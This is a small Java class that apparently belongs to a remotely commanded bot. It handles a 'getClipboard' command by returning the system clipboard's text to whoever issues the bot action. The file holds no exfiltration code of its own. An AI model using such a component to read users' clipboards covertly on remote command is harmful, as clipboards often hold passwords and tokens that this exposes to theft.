package ru.hzerr.v2.command.processor.impl;

import ru.hzerr.deprecated.processor.Command;
import ru.hzerr.v2.command.processor.BaseProcessor;
import ru.hzerr.v2.format.v1.BotAction;

import java.awt.*;
import java.awt.datatransfer.DataFlavor;

@Command("getClipboard")
public class ClipboardProcessor extends BaseProcessor {

    @Override
    protected void onInitialize() throws Exception {

    }

    @Override
    protected String onProcess(BotAction action) throws Exception {
        return (String) Toolkit.getDefaultToolkit().getSystemClipboard().getData(DataFlavor.stringFlavor);
    }

    @Override
    protected void onDestroy() throws Exception {

    }
}
